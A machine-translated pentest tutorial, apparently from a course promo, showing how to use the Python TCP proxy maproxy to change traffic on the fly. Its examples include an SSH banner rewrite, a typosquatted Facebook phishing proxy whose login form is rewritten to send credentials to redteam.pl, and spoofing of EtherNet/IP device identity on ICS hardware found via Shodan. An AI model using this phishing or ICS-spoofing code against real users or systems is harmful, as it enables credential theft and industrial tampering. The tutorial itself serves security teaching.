<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>‚ôêÔ∏è üßùüèΩ üè∑Ô∏è Network data processing on the fly üê∞ ‚¨áÔ∏è üçé</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A translation of the article was prepared ahead of the start of the Pentest. Penetration Testing Practice . ‚Äù
 
 
 
 
 annotation
 Various types of se...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Network data processing on the fly</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/otus/blog/497414/"><i><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A translation of the article was prepared ahead of the start of </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the Pentest. </font><font style="vertical-align: inherit;">Penetration Testing Practice</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;">‚Äù</font></a></font><br>
</b></i><br>
<br>
<img src="https://habrastorage.org/webt/1q/xe/yo/1qxeyod77kael1ztgqsdqtwxwgk.png"><br>
<hr><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">annotation</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Various types of security assessments, from regular penetration testing and Red Team operations to hacking IoT / ICS devices and SCADA, mean working with binary network protocols, that is, in essence, intercepting and modifying network data between the client and the target. Sniffing network traffic is not a difficult task, since we have tools such as Wireshark, Tcpdump or Scapy, but the modification seems to be more time-consuming, because we will need a unique interface for reading network data, filtering it, changing it on the fly and sending back to the target host in almost real time. In addition, it would be ideal if such a tool could automatically work with several parallel connections and had the ability to customize using scripts.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Once I discovered a tool called </font></font><code><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=">maproxy</a></code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, the documentation quickly let me know that </font></font><code>maproxy</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- just what I needed. </font><font style="vertical-align: inherit;">This is a fairly simple, versatile, and easy to configure TCP proxy. </font><font style="vertical-align: inherit;">I tested this tool on several fairly complex applications, including ICS devices (which generate many packages) to find out if it can work with many parallel connections, and the tool performed well. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
This article will introduce you to the processing of network data on the fly with </font></font><code>maproxy</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font><a name="habracut"></a><br>
 <br>
 <h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Overview</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 The tool is </font></font><code>maproxy</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">based on Tornado, a popular and well-developed asynchronous Python network framework. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In general, it can work in several modes:</font></font><br>
<br>
<ul>
<li><code>TCP:TCP</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - unencrypted TCP connections;</font></font></li>
<li><code>TCP:SSL</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">and </font></font><code>SSL:TCP</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- with one-way encryption;</font></font></li>
<li><code>SSL:SSL</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - two-way encryption.</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
It comes as a library. </font><font style="vertical-align: inherit;">For quick start you can use sample files that reflect the main </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">functions of the library</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<ul>
<li><code>all.py</code></li>
<li><code>certificate.pem</code></li>
<li><code>logging_proxy.py</code></li>
<li><code>privatekey.pem</code></li>
<li><code>ssl2ssl.py</code></li>
<li><code>ssl2tcp.py</code></li>
<li><code>tcp2ssl.py</code></li>
<li><code>tcp2tcp.py</code></li>
</ul><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Case 1 - Simple Bidirectional Proxy</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Based on </font></font><code>tcp2tcp.py</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/env python</span><font></font>
<font></font>
<span class="hljs-keyword">import</span> tornado.ioloop
<span class="hljs-keyword">import</span> maproxy.proxyserver<font></font>
<font></font>
server = maproxy.proxyserver.ProxyServer(<span class="hljs-string">"localhost"</span>,<span class="hljs-number">22</span>)<font></font>
server.listen(<span class="hljs-number">2222</span>)<font></font>
tornado.ioloop.IOLoop.instance().start()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
By default, it </font></font><code>ProxyServer()</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">takes two arguments - the connection location and the destination port. </font></font><code>server.listen()</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">takes one argument - the port for listening to the incoming connection. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Script execution:</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment"># python tcp2tcp.py</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In order to conduct the test, we are going to connect to the local SSH server through our proxy script, which listens on the </font></font><code>2222/tcp</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">port and connects to the standard </font></font><code>22/tcp</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH server </font><font style="vertical-align: inherit;">port </font><font style="vertical-align: inherit;">: </font></font><br>
<br>
<img src="https://habrastorage.org/webt/9j/y7/oa/9jy7oaokzwrnn0gbqtpu9znzqoy.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A welcome banner informs us that our sample script successfully proxied network traffic.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Case 2 - data modification</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Another demo script is </font></font><code>logging_proxy.py</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ideal for interacting with network data. </font><font style="vertical-align: inherit;">The comments in the file describe class methods that you can modify to achieve your goal: </font></font><br>
<br>
<img src="https://habrastorage.org/webt/qa/ku/0k/qaku0ksdvlbvupbdjiigsmxrznk.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The most interesting here:</font></font><br>
<br>
<ul>
<li><code>on_c2p_done_read</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - to intercept data on the way from the client to the server;</font></font></li>
<li><code>on_p2s_done_read</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - reversed.</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Let's try changing the SSH banner that the server returns to the client:</font></font><br>
<br>
<pre><code class="python hljs">[‚Ä¶]
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">on_p2s_done_read</span>(<span class="hljs-params">self,data</span>):</span>
data = data.replace(<span class="hljs-string">"OpenSSH"</span>, <span class="hljs-string">"DumnySSH"</span>)<font></font>
super(LoggingSession,self).on_p2s_done_read(data)<font></font>
[‚Ä¶]<font></font>
server = maproxy.proxyserver.ProxyServer(<span class="hljs-string">"localhost"</span>,<span class="hljs-number">22</span>)<font></font>
server.listen(<span class="hljs-number">2222</span>)<font></font>
[‚Ä¶]</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Run the script: </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yo/fg/qi/yofgqis6nzt4u48qws0eqniyqlk.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
As you can see, the client was misled, because for it the name of the SSH server was changed to </font></font><code>¬´DumnySSH¬ª</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/zv/ae/cn/zvaecndo1kbpjikei9_st9ay5nk.png"><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Case 3 - Simple Phishing Web Page</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
There are an infinite number of uses for this tool. This time, let's focus on something more practical from the Red Team operations area. Let us imitate the Landing </font></font><code>m.facebook.com</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, and use custom domain with intentional typo, for example </font></font><code>m.facebok.com</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. For demonstration purposes, simply assume that the domain is registered by us. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We are going to establish an unencrypted network connection with our victims proxy and SSL Stream for the Facebook server ( </font></font><code>31.13.81.36</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">). In order for this example to work, we need to replace the HTTP host header and implement the correct host name, and we will also disable response compression to get easy access to their contents. Ultimately, we will replace the HTML form so that the login credentials are sent to us, instead of the Facebook servers:</font></font><br>
<br>
<pre><code class="python hljs">[‚Ä¶]
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">on_c2p_done_read</span>(<span class="hljs-params">self,data</span>):</span>
 <span class="hljs-comment"># replace Host header</span>
data = data.replace(<span class="hljs-string">"Host: m.facebok.com"</span>, <span class="hljs-string">"Host: m.facebook.com"</span>)
<span class="hljs-comment"># disable compression</span>
data = data.replace(<span class="hljs-string">"gzip"</span>, <span class="hljs-string">"identity;q=0"</span>)<font></font>
data = data.replace(<span class="hljs-string">"deflate"</span>, <span class="hljs-string">""</span>)<font></font>
super(LoggingSession,self).on_c2p_done_read(data)<font></font>
[‚Ä¶]<font></font>
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">on_p2s_done_read</span>(<span class="hljs-params">self,data</span>):</span>
 <span class="hljs-comment"># partial replacement of response</span>
     data = data.replace(<span class="hljs-string">"action=\"/login/"</span>, <span class="hljs-string">"action=\"https://redteam.pl/"</span>)<font></font>
super(LoggingSession,self).on_p2s_done_read(data)<font></font>
[‚Ä¶]<font></font>
server = maproxy.proxyserver.ProxyServer(<span class="hljs-string">"31.13.81.36"</span>,<span class="hljs-number">443</span>, session_factory=LoggingSessionFactory(), server_ssl_options=<span class="hljs-literal">True</span>)<font></font>
server.listen(<span class="hljs-number">80</span>)<font></font>
[‚Ä¶]</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In the end: </font></font><br>
<br>
<img src="https://habrastorage.org/webt/6f/cm/qz/6fcmqznxf9y_xgyy6sbaweqawoq.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
As you can see, we were able to successfully replace the original site.</font></font><br>
 <br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Case 4 - Ethernet / IP Port</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
I have been dealing with industrial devices and software (ICS / SCADA) for quite some time, such as programmable controllers (PLC), I / O modules, drives, relays, ladder programming environments, and much more. </font><font style="vertical-align: inherit;">This case is for those who like industrial stuff. </font><font style="vertical-align: inherit;">Hacking such solutions involves an active game with network protocols. </font><font style="vertical-align: inherit;">In the following example, I would like to show how you can modify the ICS / SCADA network traffic. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
To do this, you will need the following:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Network sniffer, for example, Wireshark;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ethernet / IP or just a SIP device, you can find it using the Shodan service;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Our script based </font></font><code>maproxy</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
To get started, let's see what a typical CIP (Common Industrial Protocol) identification response looks like: </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fm/fl/ou/fmflouqm5oy3jmhqovz0basoc8y.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Device identification is done using Ethernet / IP, which is an extended version of Ethernet for industrial applications, it wraps control protocols such as CIP. </font><font style="vertical-align: inherit;">We are going to change the highlighted identification name, which can be seen in the screenshot of </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚ÄúNI-IndComm for Ethernet‚Äù</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> using our proxy script. </font><font style="vertical-align: inherit;">We could reuse the script </font></font><code>logging_proxy.py</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">and similarly modify the class method </font></font><code>on_p2s_done_read</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, since we want a different identification name to be visible on the client. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The code:</font></font><br>
<br>
<pre><code class="python hljs">[‚Ä¶]
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">on_p2s_done_read</span>(<span class="hljs-params">self,data</span>):</span>
 <span class="hljs-comment"># partial replacement of response</span><font></font>
<font></font>
 <span class="hljs-comment"># Checking if we got List Identity message response</span>
     <span class="hljs-keyword">if</span> data[<span class="hljs-number">26</span>:<span class="hljs-number">28</span>] == <span class="hljs-string">b'\x0c\x00'</span>:<font></font>
         print(<span class="hljs-string">'Got response, replacing'</span>)<font></font>
         data = data[:<span class="hljs-number">63</span>] + <span class="hljs-string">'DUMMY31337'</span>.encode(<span class="hljs-string">'utf-8'</span>) + data[<span class="hljs-number">63</span>+<span class="hljs-number">10</span>:]<font></font>
     super(LoggingSession,self).on_p2s_done_read(data)<font></font>
[‚Ä¶]<font></font>
server = maproxy.proxyserver.ProxyServer(<span class="hljs-string">"1.3.3.7"</span>,<span class="hljs-number">44818</span>,session_factory=LoggingSessionFactory())<font></font>
server.listen(<span class="hljs-number">44818</span>)<font></font>
[‚Ä¶]<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In fact, we asked for device identification twice, the second answer is the original, and the first was modified on the fly.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">And the last</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In my opinion, a </font></font><code>maproxy</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">convenient and simple tool that is also written in Python, so I believe that you can also benefit from its use. </font><font style="vertical-align: inherit;">Of course, there are more sophisticated tools for processing and changing network data, but they also require more attention and are usually created for a specific use case, for example, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Muraena</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Modlishka</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> or </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">evilginx</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> for cases similar to the third, or </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">canape</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> for the last case. </font><font style="vertical-align: inherit;">One way or another, with help </font></font><code>maproxy</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">you can quickly realize your ideas for intercepting network data, as the script examples are very clear.</font></font><br>
<br>
<hr><br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Testing authentication mechanisms in Windows AD</font></font></a><br>
<br>
<hr></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../en497398/index.html">AMD EPYC Rome 7x32 Server Processors - Record Single Core Performance</a></li>
<li><a href="../en497402/index.html">How to create a Python programming language?</a></li>
<li><a href="../en497404/index.html">T + Conf 2019: Tarantool at Aeroflot, or MDM on the fly</a></li>
<li><a href="../en497408/index.html">How Russian polar explorers got cellular communications in Antarctica</a></li>
<li><a href="../en497412/index.html">Data Scientist: quarantined life memories and hope for the future</a></li>
<li><a href="../en497416/index.html">Touch Support in JavaScript</a></li>
<li><a href="../en497420/index.html">StegoPy - LSB Steganography Tool in Python</a></li>
<li><a href="../en497422/index.html">Cisco UCS through the eyes of a cloud provider</a></li>
<li><a href="../en497428/index.html">How we learned how to divide video into scenes using clever math</a></li>
<li><a href="../en497432/index.html">SSL Certificate Management: From Chaos on Hundreds of Servers to a Centralized Solution</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>